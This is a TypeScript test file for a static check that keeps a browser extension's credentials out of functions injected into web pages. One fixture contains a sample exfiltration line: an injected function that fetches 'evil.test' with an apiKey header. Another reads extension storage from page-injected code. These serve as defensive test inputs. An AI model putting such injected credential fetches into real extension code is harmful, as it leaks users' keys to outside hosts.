import test from 'node:test';
import assert from 'node:assert/strict';

import {
  injectionLiterals,
  injectionViolations,
  manifestScopeViolations,
} from '../../fitness/checks/credential-confinement.ts';

test('the injected function is extracted whole, braces and all', () => {
  // The reason for brace-balancing rather than a regex: a non-greedy match
  // stops at the first `}` inside the arrow body and silently checks a
  // fragment. A check that reads half its input reports green.
  const source = `await chrome.scripting.executeScript({
    target: { tabId },
    func: () => { const s = window.getSelection(); return s ? s.toString() : ''; },
  });`;
  const [literal] = injectionLiterals(source);
  assert.ok(literal?.includes('getSelection'), 'the arrow body must be inside the extracted literal');
  assert.ok(literal?.trimEnd().endsWith('}'), 'the literal must be closed, not truncated at the first brace');
});

test('a credential referenced inside an injected function is caught', () => {
  const source = `chrome.scripting.executeScript({
    target: { tabId },
    func: () => fetch('https://evil.test', { headers: { k: apiKey } }),
  });`;
  const violations = injectionViolations('src/capture.ts', source);
  assert.equal(violations.length, 1);
  assert.match(violations[0]!.detail, /apiKey/);
});

test('storage reached from injected code is caught even without the word "key"', () => {
  const source = `chrome.scripting.executeScript({
    target: { tabId },
    func: async () => (await chrome.storage.local.get()).anything,
  });`;
  assert.equal(injectionViolations('src/capture.ts', source).length, 1);
});

test('passing args to an injected function is caught, because args is how a value travels', () => {
  const source = `chrome.scripting.executeScript({
    target: { tabId },
    args: [something],
    func: (x) => x,
  });`;
  const violations = injectionViolations('src/capture.ts', source);
  assert.equal(violations.length, 1);
  assert.match(violations[0]!.detail, /passes `args`/);
});

test('the real injection in src/capture.ts is clean', () => {
  const source = `chrome.scripting.executeScript({
    target: { tabId },
    func: () => window.getSelection()?.toString() ?? '',
  });`;
  assert.deepEqual(injectionViolations('src/capture.ts', source), []);
});

test('a content script in the manifest is caught', () => {
  assert.deepEqual(manifestScopeViolations({ permissions: ['storage'] }), []);
  const violations = manifestScopeViolations({ content_scripts: [{ matches: ['<all_urls>'] }] });
  assert.equal(violations.length, 1);
  assert.match(violations[0]!.detail, /second page-world scope/);
});
